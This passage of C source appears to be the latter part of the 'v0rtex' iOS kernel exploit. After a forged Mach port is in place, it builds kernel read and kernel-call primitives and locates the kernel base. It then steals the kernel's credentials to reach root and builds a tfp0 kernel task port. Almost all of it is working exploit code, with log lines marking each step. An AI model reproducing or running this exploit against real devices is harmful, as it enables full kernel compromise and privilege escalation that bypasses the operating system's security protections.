    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    assure(!ret);
    doassure(size >= DATA_SIZE + 0x10, {
        LOG("Response too short.");
    });

    kptr_t fakeport_addr = ((volatile kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest;

    doassure(realport_addr, {
        LOG("Failed to leak fakeport address");
    });

    LOG("fakeport addr: %p", (void*)fakeport_addr);
    kptr_t fake_addr = fakeport_addr - fakeport_off;

    kport_request_t kreq;
    kport.ip_requests = fakeport_addr + ((uintptr_t)&kport.ip_context - (uintptr_t)&kport) - ((uintptr_t)&kreq.name.size - (uintptr_t)&kreq);
    *fakeport_buf = kport;

    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    assure(!ret);

#define KREAD(addr, buf, len) \
do{ \
    for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i){ \
        ret = my_mach_port_set_context(self, fakeport, (addr) + i * sizeof(uint32_t)); \
        doassure(!ret, { \
            LOG("mach_port_set_context: %s", mach_error_string(ret)); \
        });\
        mach_msg_type_number_t outsz = 1; \
        ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
        doassure(!ret, { \
            LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
        });\
    } \
} while(0)

    kptr_t itk_space = 0;
    KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    LOG("itk_space: %p", (void*)itk_space);
    assure(itk_space);

    kptr_t self_task = 0;
    KREAD(itk_space + OFFSET_IPC_SPACE_IS_TASK, &self_task, sizeof(self_task));
    LOG("self_task: %p", (void*)self_task);
    assure(self_task);

    kptr_t IOSurfaceRootUserClient_port = 0;
    KREAD(self_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    LOG("IOSurfaceRootUserClient port: %p", (void*)IOSurfaceRootUserClient_port);
    assure(IOSurfaceRootUserClient_port);

    kptr_t IOSurfaceRootUserClient_addr = 0;
    KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    LOG("IOSurfaceRootUserClient addr: %p", (void*)IOSurfaceRootUserClient_addr);
    assure(IOSurfaceRootUserClient_addr);

    kptr_t IOSurfaceRootUserClient_vtab = 0;
    KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    LOG("IOSurfaceRootUserClient vtab: %p", (void*)IOSurfaceRootUserClient_vtab);
    assure(IOSurfaceRootUserClient_vtab);
    
    kptr_t IOSurfaceRootUserClient_vtab_2 = 0;
    KREAD(IOSurfaceRootUserClient_vtab+2*4, &IOSurfaceRootUserClient_vtab_2, 4);
    
    
    kptr_t kbase_ = (IOSurfaceRootUserClient_vtab_2 & 0xfff00000) + 0x1000;
    
    for (uint32_t magic = 0; 1; kbase_ -=0x10000) {
        KREAD(kbase_, &magic, 4);
        if (magic == 0xfeedface)
            break;
    }
    
    
    kptr_t slide = kbase_ - 0x80001000;
    LOG("kbase at: %p",(void*)kbase_);

    uint32_t khead = 0;
    KREAD(kbase_, &khead, 4);
    LOG("reading kbase: 0x%08x",khead);
    assure(khead == 0xfeedface);


#define OFF(name) (name + slide)

    ret = mach_ports_register(self, NULL, 0);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    assure(!ret);

    kptr_t zone_map_addr = 0;
    KREAD(OFF(OFFSET_ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
    LOG("zone_map: %p", (void*)zone_map_addr);
    assure(zone_map_addr);

    kptr_t vtab[0x400 / sizeof(kptr_t)] = { 0 };
    KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX] = OFF(OFFSET_ROP_LDR_R0_R0_0XC);

    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
    faketask_off = KPTR_ALIGN(faketask_off);
    volatile ktask_t *faketask_buf = (volatile ktask_t*)((uintptr_t)&dict[5] + faketask_off);

    ktask_t ktask;
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.a.map = zone_map_addr;
//    ktask.b.itk_self = 1;
    *(kptr_t*)(&ktask.b._itk_self[OFFSET_TASK_ITK_SELF]) = 1;
    *faketask_buf = ktask;

    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = fake_addr + faketask_off;

    kport.ip_requests = 0;
    *fakeport_buf = kport;

#undef KREAD
    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    assure(!ret);

    mach_vm_address_t shmem_addr = 0;
    vm_prot_t cur = 0,
    max = 0;
    ret = mach_vm_remap(self, &shmem_addr, DATA_SIZE, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    assure(!ret);

//    doassure(!mlock((void*)shmem_addr, DATA_SIZE),{
//        LOG("mlock failed");
//    });
    LOG("shmem_addr: %p", (void*)shmem_addr);
    fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);

    uint32_t vtab_off = fakeport_off < sizeof(vtab) ? fakeport_off + sizeof(kport_t) : 0;
    vtab_off = KPTR_ALIGN(vtab_off);
    kptr_t vtab_addr = fake_addr + vtab_off;
    LOG("vtab addr: %p", (void*)vtab_addr);
    volatile kptr_t *vtab_buf = (volatile kptr_t*)(shmem_addr + vtab_off);
    
    for(volatile char *src = (volatile char*)vtab, *dst = (volatile char*)vtab_buf, *end = src + sizeof(vtab); src < end; *(dst++) = *(src++));


#define MAXRANGES 5
    struct {
        uint32_t start;
        uint32_t end;
    } ranges[MAXRANGES] =
    {
        { fakeport_off, (uint32_t)(fakeport_off + sizeof(kport_t)) },
        { vtab_off, (uint32_t)(vtab_off + sizeof(vtab)) },
    };
    size_t numranges = 2;
#define FIND_RANGE(var, size) \
do{ \
    doassure(numranges < MAXRANGES,{\
        LOG("FIND_RANGE(" #var "): ranges array too small"); \
    });\
    for(int32_t i = 0; i < numranges; ++i){ \
        uint32_t end = var + (uint32_t)(size); \
        if( \
           (var >= ranges[i].start && var < ranges[i].end) || \
           (end >= ranges[i].start && var < ranges[i].end) \
          ){ \
                var = KPTR_ALIGN(ranges[i].end); \
                i = -1; \
           } \
    } \
    doassure((var + (uint32_t)(size) <= DATA_SIZE), {\
        LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
    });\
    ranges[numranges].start = var; \
    ranges[numranges].end = var + (uint32_t)(size); \
    ++numranges; \
} while(0)

    typedef union
    {
        struct {
            // IOUserClient fields
            kptr_t vtab;
            uint32_t refs;
            uint32_t pad;
#ifndef __LP64__
            kptr_t trap_ptr;
#endif
            // IOExternalTrap fields
            kptr_t obj;
            kptr_t func;
            uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
            // OSSerializer::serialize
            kptr_t indirect[3];
        } a;
        struct {
//            char pad[OFFSET_IOUSERCLIENT_IPC];
//            int32_t __ipc;
            int32_t ___;
            char __ipc[OFFSET_IOUSERCLIENT_IPC_HARDCODE];
        } b;
    } kobj_t;

    uint32_t fakeobj_off = 0;
    FIND_RANGE(fakeobj_off, sizeof(kobj_t));
    kptr_t fakeobj_addr = fake_addr + fakeobj_off;
    LOG("fakeobj addr: %p", (void*)fakeobj_addr);
    volatile kobj_t *fakeobj_buf = (volatile kobj_t*)(shmem_addr + fakeobj_off);
    for(volatile char *ptr = (volatile char*)fakeobj_buf, *end = ptr + sizeof(*fakeobj_buf); ptr < end; *(ptr++) = 0);

    fakeobj_buf->a.vtab = vtab_addr;
    fakeobj_buf->a.refs = 100;
#ifndef __LP64__
    fakeobj_buf->a.trap_ptr = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.obj - (uintptr_t)fakeobj_buf);
#endif
//    fakeobj_buf->b.__ipc = 100;
    *(int32_t*)(&fakeobj_buf->b.__ipc[OFFSET_IOUSERCLIENT_IPC]) = 100;


    fakeport_buf->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    fakeport_buf->ip_kobject = fakeobj_addr;

#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6)( \
    fakeobj_buf->a.obj = (kptr_t)(x0), \
    fakeobj_buf->a.func = (kptr_t)(addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6))\
)
#define KCALL_ZERO(addr, x0, x1, x2)( \
    fakeobj_buf->a.obj = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.indirect - (uintptr_t)fakeobj_buf) - 2 * sizeof(kptr_t), \
    fakeobj_buf->a.func = OFF(OFFSET_OSSERIALIZER_SERIALIZE), \
    fakeobj_buf->a.indirect[0] = (x0), \
    fakeobj_buf->a.indirect[1] = (x1), \
    fakeobj_buf->a.indirect[2] = (addr), \
    (kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
)
    kptr_t kernel_task_addr = 0;
    kern_return_t r = KCALL(OFF(OFFSET_COPYOUT), OFF(OFFSET_KERNEL_TASK), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    LOG("kernel_task addr: %p %s", (void*)kernel_task_addr, mach_error_string(r));
    assure(!r && kernel_task_addr);

    kptr_t kernproc_addr = 0;
    r = KCALL(OFF(OFFSET_COPYOUT), kernel_task_addr + OFFSET_TASK_BSD_INFO, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    LOG("kernproc addr: %p, %s", (void*)kernproc_addr, errstr(r));
    assure(!r && kernproc_addr);

    kptr_t kern_ucred = 0;
    r = KCALL(OFF(OFFSET_COPYOUT), kernproc_addr + OFFSET_PROC_UCRED, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("kern_ucred: %p, %s", (void*)kern_ucred, errstr(r));
    assure(!r && kern_ucred);

    kptr_t self_proc = 0;
    r = KCALL(OFF(OFFSET_COPYOUT), self_task + OFFSET_TASK_BSD_INFO, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    LOG("self_proc: %p, %s", (void*)self_proc, errstr(r));
    assure(!r && self_proc);

    kptr_t self_ucred = 0;
    r = KCALL(OFF(OFFSET_COPYOUT), self_proc + OFFSET_PROC_UCRED, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    LOG("self_ucred: %p, %s", (void*)self_ucred, errstr(r));
    assure(!r && self_ucred);

    int olduid = getuid();
    LOG("uid: %u", olduid);
    
    KCALL(OFF(OFFSET_KAUTH_CRED_REF), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(OFFSET_COPYIN), &kern_ucred, self_proc + OFFSET_PROC_UCRED, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    assure(!r && self_ucred);

    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    LOG("stole the kernel's credentials");
    setuid(0); // update host port
    
    int newuid = getuid();
    LOG("uid: %u", newuid);
    
    if(newuid != olduid){
        KCALL_ZERO(OFF(OFFSET_CHGPROCCNT), newuid, 1, 0);
        KCALL_ZERO(OFF(OFFSET_CHGPROCCNT), olduid, -1, 0);
    }

    host_t realhost = mach_host_self();
    LOG("realhost: %x (host: %x)", realhost, host);

    uint32_t zm_task_off = 0;
    FIND_RANGE(zm_task_off, sizeof(ktask_t));
    kptr_t zm_task_addr = fake_addr + zm_task_off;
    LOG("zm_task addr: %p", (void*)zm_task_addr);
    volatile ktask_t *zm_task_buf = (volatile ktask_t*)(shmem_addr + zm_task_off);
    for(volatile char *ptr = (volatile char*)zm_task_buf, *end = ptr + sizeof(*zm_task_buf); ptr < end; *(ptr++) = 0);

    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
//    zm_task_buf->b.itk_self = 1;
    *(kptr_t*)(&zm_task_buf->b._itk_self[OFFSET_TASK_ITK_SELF]) = 1;
    zm_task_buf->a.map = zone_map_addr;

    uint32_t km_task_off = 0;
    FIND_RANGE(km_task_off, sizeof(ktask_t));
    kptr_t km_task_addr = fake_addr + km_task_off;
    LOG("km_task addr: %p", (void*)km_task_addr);
    volatile ktask_t *km_task_buf = (volatile ktask_t*)(shmem_addr + km_task_off);
    for(volatile char *ptr = (volatile char*)km_task_buf, *end = ptr + sizeof(*km_task_buf); ptr < end; *(ptr++) = 0);

    km_task_buf->a.lock.data = 0x0;
    km_task_buf->a.lock.type = 0x22;
    km_task_buf->a.ref_count = 100;
    km_task_buf->a.active = 1;
//    km_task_buf->b.itk_self = 1;
    *(kptr_t*)(&km_task_buf->b._itk_self[OFFSET_TASK_ITK_SELF]) = 1;
    r = KCALL(OFF(OFFSET_COPYOUT), OFF(OFFSET_KERNEL_MAP), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
    LOG("kernel_map: %p, %s", (void*)km_task_buf->a.map, errstr(r));
    assure(!r && km_task_buf->a.map);

    kptr_t ipc_space_kernel = 0;
    r = KCALL(OFF(OFFSET_COPYOUT), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    LOG("ipc_space_kernel: %p, %s", (void*)ipc_space_kernel, errstr(r));
    assure(!r && ipc_space_kernel);

#define ZM_FIX_ADDR(addr) (addr)

    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(OFFSET_IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(OFFSET_IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("zm_port addr: %p", (void*)ptrs[0]);
    LOG("km_port addr: %p", (void*)ptrs[1]);

    KCALL(OFF(OFFSET_IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(OFFSET_IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);

    r = KCALL(OFF(OFFSET_COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    assure(!r);

    mach_msg_type_number_t mapsNum = 0;
    ret = mach_ports_lookup(self, &maps, &mapsNum);
    LOG("mach_ports_lookup: %s", mach_error_string(ret));
    assure(!ret);

    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    assure(MACH_PORT_VALID(maps[0]) && MACH_PORT_VALID(maps[1]));

    // Clean out the pointers without dropping refs
    KCALL(OFF(OFFSET_BZERO), self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0, 0);

    mach_vm_address_t remap_addr = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, OFFSET_SIZEOF_TASK, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    assure(!ret);

    LOG("remap_addr: 0x%016llx", remap_addr);

    ret = mach_vm_wire(realhost, maps[1], remap_addr, OFFSET_SIZEOF_TASK, VM_PROT_READ | VM_PROT_WRITE);
    LOG("mach_vm_wire: %s", mach_error_string(ret));
    assure(!ret);

    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(OFFSET_IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("newport: %p", (void*)newport);
    KCALL(OFF(OFFSET_IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(OFFSET_IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(OFFSET_COPYIN), &newport, OFF(OFFSET_REALHOST) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    assure(!r);

    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
    assure(!ret && MACH_PORT_VALID(kernel_task));

    *tfp0 = kernel_task;
    *kbase = kbase_;
    retval = KERN_SUCCESS;
    
    LOG("Cleaning up...");
    if(maps){
        RELEASE_PORT(maps[0]);
        RELEASE_PORT(maps[1]);
    }
    RELEASE_PORT(fakeport);
    for(size_t i = 0; i < NUM_AFTER; ++i)
        RELEASE_PORT(after[i]);
    
    RELEASE_PORT(port);
    for(size_t i = 0; i < NUM_BEFORE; ++i)
        RELEASE_PORT(before[i]);
    
    RELEASE_PORT(realport);
    RELEASE_PORT(client);
    
//    doassure(!my_mach_zone_force_gc(host), {
//        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
//    });
    
    {   /* my_mach_zone_force_gc */
        for(size_t i = 0; i < NUM_GC; ++i){
            ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &gc[i]);
            doassure(!ret,{
                LOG("mach_port_allocate: %s", mach_error_string(ret));
            });
        }
        for(size_t i = NUM_GC; i > 0; --i){
            if(MACH_PORT_VALID(gc[i - 1])){
                _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
                gc[i - 1] = MACH_PORT_NULL;
            }
        }
    }
    
    // Pass through error code, if existent
    if(retval != KERN_SUCCESS && ret != KERN_SUCCESS)
        retval = ret;
    
    return retval;
}

#else

int v0rtex(){
    return 0;
}

#endif

//
